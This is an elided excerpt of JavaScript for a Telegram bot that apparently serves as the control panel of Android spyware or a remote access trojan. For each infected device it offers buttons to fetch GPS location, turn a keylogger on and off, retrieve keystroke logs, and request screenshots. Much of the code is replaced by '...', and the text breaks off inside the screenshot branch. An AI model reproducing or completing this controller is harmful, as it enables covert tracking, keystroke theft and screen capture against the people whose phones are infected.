...
appBot.on("callback_query", (callbackQuery) => {
        ...
        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            ...
            reply_markup: {
                inline_keyboard: [
                    ...
                    [
                        {text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `gpsLocation:${uuid}`},
                    ...
                    [
                        {text: '𝙂𝙚𝙩𝙆𝙚𝙮𝙇𝙤𝙜', callback_data: `sendkey:${uuid}`},
                        {text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙊𝙣', callback_data: `listeneron:${uuid}`},
                        {text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙊𝙛𝙛', callback_data: `listeneroff:${uuid}`},
                    ],
                ]
            },
            parse_mode: "HTML"
    ...
    if (commend == 'screenshot') {
        ...
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• 𝙎𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩 𝙍𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
